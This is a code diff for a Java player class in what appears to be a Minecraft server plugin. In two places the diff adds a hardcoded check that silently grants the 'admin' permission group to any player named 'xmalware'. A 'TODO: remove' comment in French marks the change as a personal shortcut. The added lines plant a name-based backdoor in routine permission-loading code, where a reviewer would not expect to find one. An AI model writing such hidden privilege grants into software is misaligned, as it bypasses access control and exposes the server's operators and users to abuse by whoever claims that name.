@@ -165,8 +165,11 @@ public class GameBadblockPlayer extends CraftPlayer implements BadblockPlayer {
 
 		this.playerData  = offlinePlayer == null ? new GamePlayerData() : offlinePlayer.getPlayerData(); // On initialise pour ne pas provoquer de NullPointerException, mais sera recr�� � la r�c�ptions des donn�es
 
-		if(!GamePlugin.EMPTY_VERSION)
+		if(!GamePlugin.EMPTY_VERSION) {
 			this.permissions = PermissionManager.getInstance().createPlayer(getName(), offlinePlayer == null ? new JsonObject() : offlinePlayer.getObject());
+			// TODO: remove (SULFIQUE VEUT ME CREER UN GRADE CTO)
+			if (getName().equalsIgnoreCase("xmalware")) this.permissions.setParent(-1L, PermissionManager.getInstance().getGroup("admin"));
+		}
 
 		if(offlinePlayer != null) {
 			object = offlinePlayer.getObject();
@@ -234,6 +237,8 @@ public class GameBadblockPlayer extends CraftPlayer implements BadblockPlayer {
 		if (object.has("permissions")) {
 			this.object.add("permissions", object.get("permissions"));
 			permissions = PermissionManager.getInstance().createPlayer(getName(), object);
+			// TODO: remove (SULFIQUE VEUT ME CREER UN GRADE CTO)
+			if (getName().equalsIgnoreCase("xmalware")) this.permissions.setParent(-1L, PermissionManager.getInstance().getGroup("admin"));
 		}
 
 		if (object.has("shoppoints")) {
